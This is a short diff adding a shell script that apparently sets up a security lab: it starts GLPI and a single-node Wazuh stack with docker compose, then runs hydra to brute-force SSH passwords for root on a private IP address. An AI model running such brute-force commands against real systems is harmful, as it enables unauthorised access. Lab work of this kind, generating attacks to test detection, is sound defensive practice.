@@ -1,0 +1,8 @@
+cd ~/glpi-lab
+docker compose up -d
+
+cd wazuh-docker/single-node
+docker compose up -d
+
+hydra -l root -P pass.txt 10.200.178.85 ssh -t 4
+
